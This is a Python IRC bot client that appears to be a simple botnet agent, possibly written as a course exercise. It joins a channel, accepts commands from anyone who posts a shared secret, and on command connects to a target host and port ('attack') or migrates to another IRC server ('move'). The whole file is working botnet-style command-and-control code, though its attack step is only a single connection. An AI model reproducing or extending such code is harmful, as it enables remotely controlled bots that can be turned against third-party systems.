import socketserver
import socket, threading
import sys
from collections import deque
import time
import string
import random
import select
import errno
from socket import error as socket_error

def sendPrivMSG(target,message):
    client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))

def do_status(client, args, id, controller):
    sendPrivMSG(controller,'bot'+id)

def do_attack(client, args, id, controller):
    global counter
    botClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        botClient.connect((args[1],int(args[2])))
        botClient.send((str(counter)+' '+'bot'+id+'\n').encode('utf-8'))
        counter += 1
        sendPrivMSG(controller, 'bot'+id+': attack successful')
        botClient.close()
    except socket.error:
        sendPrivMSG(controller, 'bot'+id+': attack unsuccessful, connection refused')
    print("attack", args[1], args[2])

def do_move(client, args, id, controller):
    for _ in range(5):
        try:
            newClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            newClient.connect((args[1],int(args[2])))
        except socket.error:
            print('Connection refused. Trying again...')
            continue
        print('Connected.')
        while True:
            print(id)
            newClient.send(('NICK bot'+id+'\n').encode('utf-8'))
            try:
                newClient.settimeout(4)
                data = newClient.recv(1024).decode('utf-8')
                print ('IRC said:', data)
                if not data == 'ERR_NICKNAMEINUSE':
                    break
            except socket.timeout:
                break
            id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
        newClient.settimeout(None)
        newClient.send(('USER bot * * :Bot BotMacBotFace\n').encode('utf-8'))
        data = newClient.recv(1024).decode('utf-8')
        print('response: ',data)
        if not '001' in data:
            print('You are not welcome')
            continue
        newClient.send(('JOIN '+args[3][1:]+'\n').encode('utf-8'))
        data = newClient.recv(1024).decode('utf-8')
        if not '331' in data and not '332' in data:
            print('Could not connect to channel.')
            continue
        else:
            print('Joined new channel.')
            sendPrivMSG(controller, 'bot'+id+': move successful')
            client.send(('QUIT\n').encode('utf-8'))
            client.close()
            return
    print("bots connect to the new IRC server")

def do_quit(client, args, id, controller):
    client.close()

def do_shutdown(client, args, id, controller):
    print("shutdown the bots")

# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'status':do_status,
    'attack':do_attack,
    'move':do_move,
    'quit':do_quit,
    'shutdown':do_shutdown
}

authorizedControllers = []
controller = ''
counter = 0

if __name__ == "__main__":
    # getting the arguments when server is running with no options
    HOST = sys.argv[1]
    srcPort = int(sys.argv[2])
    channel = sys.argv[3][1:]
    secret = sys.argv[4]
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST,srcPort))
        while True:
            id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
            print(id)
            client.send(('NICK bot'+id+'\n').encode('utf-8'))
            try:
                print('in try')
                client.settimeout(4)
                data = client.recv(128).decode('utf-8')
                print ('IRC said:', data)
                if not '433' in data:
                    break
            except socket.timeout:
                break

        client.settimeout(None)
        client.send(('USER bot * * :Bot BotMacBotFace\n').encode('utf-8'))
        data = client.recv(1024).decode('utf-8')
        print('response: ',data)
        if not '001' in data:
            print('You are not welcome')
            continue
        
        client.send(('JOIN '+channel+'\n').encode('utf-8'))
        data = client.recv(1024).decode('utf-8')
        print('response: ', data)

        print('going to while')
        while True:
            data = client.recv(1024).decode('utf-8')
            lines = data.split('\n')
            for line in lines:
                print("A message from server:", data)
                messages = line.split(':')

                if len(messages) < 3:
                    continue
                else:
                    message = messages[2].strip()
                
                controller = messages[1].split('!')[0].strip()
                if controller in authorizedControllers:
                    print("Accepting command from " + controller)
                    args = message.split()
                    if not args[0] in interpretInput:
                        print("No such command\n")
                    else:
                        interpretInput[args[0]](client,args,id,controller)
                else:
                    if message == secret:
                        print(controller + " authorized")
                        authorizedControllers.append(controller)
                    else:
                        print(controller + " not authorized")
                        break


